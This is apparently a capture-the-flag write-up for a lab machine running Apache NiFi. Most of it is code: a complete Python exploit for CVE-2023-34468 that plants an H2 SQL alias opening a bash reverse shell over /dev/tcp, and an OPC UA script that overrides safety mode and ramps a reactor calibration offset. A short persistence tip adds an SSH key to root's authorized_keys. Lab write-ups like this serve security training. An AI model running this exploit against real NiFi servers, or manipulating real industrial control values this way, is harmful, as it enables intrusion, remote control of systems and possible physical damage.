### 1. Overview
This challenge involved exploiting a vulnerable Apache NiFi instance to gain remote code execution. Initial access was obtained by discovering an exposed subdomain and exploiting `CVE-2023-34468`. After gaining a shell on the system, lateral movement was accomplished by recovering a backup SSH key hidden within the NiFi installation directory. Privilege escalation was then achieved by interacting with an internal OPC UA endpoint to manipulate reactor calibration offsets, which opened a narrow maintenance window that allowed a restricted binary to execute and drop a root shell.

### 3. Foothold
This version of NiFi is vulnerable to `CVE-2023-34468`.  The vulnerability allows an attacker to create or modify controller services to supply an H2 JDBC Database URL resulting in RCE.

To exploit this I created the following script that would:
- Get the root id
- Create a database
- Enable that database
- Upload the payload
- Trigger the payload
```
import requests
import sys
import random

pool = "ABCDEFGHIJKLMNOPQRSTUVWYXZ"

requests.packages.urllib3.disable_warnings()
s = requests.Session()

HEADERS = {"Content-Type" : "application/json"}

NAME = ''.join(random.choices(pool, k=6))

def getRoot(target):
    res1 = s.get(f"{target}/nifi-api/flow/process-groups/root")
    pg_id = res1.json()["processGroupFlow"]["id"]

    print(f"Root PG ID: {pg_id}")
    return pg_id

def createDatabase(target, pg_id):
    pool_data = {
        "revision": {"version": 0},
        "component": {
            "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
            "name": "pool",
            "properties": {
                "Database Connection URL": f"jdbc:h2:mem:{NAME}",
                "Database Driver Class Name": "org.h2.Driver",
                "Database Driver Location(s)": "work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar"
            }
        }
    }

    res2 = s.post(f"{target}/nifi-api/process-groups/{pg_id}/controller-services", headers=HEADERS, json=pool_data)
    cs_id = res2.json()["id"]
    
    print(f"Controller Service ID: {cs_id}")
    return cs_id

def enableDatabase(target, cs_id):
    cs_ver = s.get(f"{target}/nifi-api/controller-services/{cs_id}").json()["revision"]["version"]

    enable_data = {
        "revision": {"version": cs_ver}, 
        "state": "ENABLED"
    }
    res = s.put(f"{target}/nifi-api/controller-services/{cs_id}/run-status", headers=HEADERS, json=enable_data)

    print(f"Service State: {res.json()['component']['state']}")

def createProcessor(target, lhost, lport, cs_id, pg_id):
    payload = 'CREATE ALIAS IF NOT EXISTS ' + NAME + ' AS $$ String p() throws Exception { Runtime.getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1"}); return ""; } $$; CALL ' + NAME + '();'

    proc_data = {
        "revision": {"version": 0},
        "component": {
            "type": "org.apache.nifi.processors.standard.ExecuteSQL",
            "name": "exec",
            "config": {
                "properties": {
                    "Database Connection Pooling Service": cs_id,
                    "SQL select query": payload
                },
                "autoTerminatedRelationships": ["success", "failure"]
            }
        }
    }

    res = s.post(f"{target}/nifi-api/process-groups/{pg_id}/processors", headers=HEADERS, json=proc_data)
    proc_id = res.json()["id"]

    print(f"Processor ID: {proc_id}")
    return proc_id

def triggerPayload(target, proc_id):
    proc_ver = s.get(f"{target}/nifi-api/processors/{proc_id}").json()["revision"]["version"]

    trigger_data = {
        "revision": {"version": proc_ver}, 
        "state": "RUNNING"
    }
    res = s.put(f"{target}/nifi-api/processors/{proc_id}/run-status", headers=HEADERS, json=trigger_data)

    print(f"Processor State: {res.json()['component']['state']}")

def main():
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <lhost> <lport>")
        print(f"Example: python3 CVE-2023-34468.py http://flow.helix.htb 10.10.10.10 9001")
        sys.exit(1)

    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    pg_id = getRoot(target)
    cs_id = createDatabase(target, pg_id)
    enableDatabase(target, cs_id)
    proc_id = createProcessor(target, lhost, lport, cs_id, pg_id)
    triggerPayload(target, proc_id)

if __name__ == '__main__':
    main()
```

Using the `operator1` password, I accessed the reactor guide which explains how to unlock restricted diagnostic tools by maneuvering the system into a narrow "Maintenance Operating Window" via the `opc.tcp://127.0.0.1:4840/helix/`. 

To reach this without triggering a safety lockout, the guide outlines a specific process: 
- switching to **MAINTENANCE** mode
- enabling **TestOverride**
- slowly ramping up the **Calibration Offset** to hit target temperature and pressure levels.

With this in mind, I used SSH to forward port `4840` to my local machine so that I could exploit it easier.

After a while of trial and error, I managed to come up with the following script to connect to the `opc.tcp://127.0.0.1:4840/helix/` endpoint and slowly change temperature to reach the maintenance window:
```
import asyncio
import logging
from asyncua import Client

URL = "opc.tcp://127.0.0.1:4840/helix/"
NODES = {
    "Temperature": "ns=2;i=4",
    "CalibrationOffset": "ns=2;i=6",
    "Mode": "ns=2;i=12",
    "TestOverride": "ns=2;i=13"
}

async def setup_connection(url):
    client = Client(url=url, timeout=30)
    client.session_timeout = 60000 
    await client.connect()
    
    await client.get_node(NODES["Mode"]).write_value("MAINTENANCE")
    await client.get_node(NODES["TestOverride"]).write_value(True)
    
    return client

async def run_exploit():
    print(f"Targeting Helix PLC at {URL}...")
    
    current_offset = 0.0 
    
    while True:
        client = None
        try:
            client = await setup_connection(URL)
            temp_node = client.get_node(NODES["Temperature"])
            offset_node = client.get_node(NODES["CalibrationOffset"])
            
            server_offset = await offset_node.read_value()
            if server_offset > current_offset:
                current_offset = server_offset

            print("Resuming Calibration Offset ramp...")

            while True:
                temp = await temp_node.read_value()
                print(f"[*] Current Temp: {temp:.2f}°C | Offset: {current_offset:.2f}    ", end="\r")

                if 295.0 <= temp < 305.0:
                    print(f"\n\n[!!!] WINDOW OPEN: {temp:.2f}°C [!!!]")
                    print("Privilege escalation is now available. Holding connection...")
                    while True: 
                        await asyncio.sleep(10)

                if temp >= 305.0:
                    if client:
                        await client.disconnect()
                    return

                current_offset += 0.5
                await offset_node.write_value(current_offset)
                await asyncio.sleep(2.0) 

        except (ConnectionError, Exception) as e:
            print(f"\n[-] Server dropped connection ({e}). Reconnecting in 3s...", end="\r")
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
            await asyncio.sleep(3)

if __name__ == "__main__":
    try:
        asyncio.run(run_exploit())
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user.")
```

Note: The root shell will drop in 2 minutes, so gaining persistence is a key part. Simply adding an ssh key to root's `~/.ssh/authorized_keys` file works fine.
### 5. Conclusion
Initial access was gained by discovering an exposed Apache NiFi instance on a subdomain. By exploiting `CVE-2023-34468`, it was possible to create a malicious database connection and execute a reverse shell. From there, a backup SSH key was recovered from the NiFi installation directory, allowing SSH access as the `operator` user.

Privilege escalation was achieved by abusing an internal OPC UA service. By forwarding the service port locally and using an automated script to slowly ramp up calibration offsets, a specific temperature window was reached. This allowed a restricted maintenance script to be executed, which resulted in root access on the machine.
